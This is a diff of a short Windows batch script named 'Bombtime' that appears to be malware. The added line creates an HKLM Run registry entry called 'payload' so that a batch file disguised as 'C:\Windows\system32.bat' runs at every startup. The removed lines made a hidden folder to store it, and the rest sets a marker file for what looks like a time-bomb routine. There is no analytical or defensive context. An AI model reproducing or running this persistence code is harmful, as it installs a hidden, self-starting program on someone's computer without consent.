@@ -1,9 +1,6 @@
 # Bombtime
 @echo off
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "payload" /t REG_SZ /F /D "C:\Windows\Config32\system32.bat"
-md c:\Windows
-mkdir Config32
-attrib +H c:\Windows\Config32
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "payload" /t REG_SZ /F /D "C:\Windows\system32.bat"
 if exist lig1.drv goto 2
 echo > lig1.drv sdfsdf
 goto fim
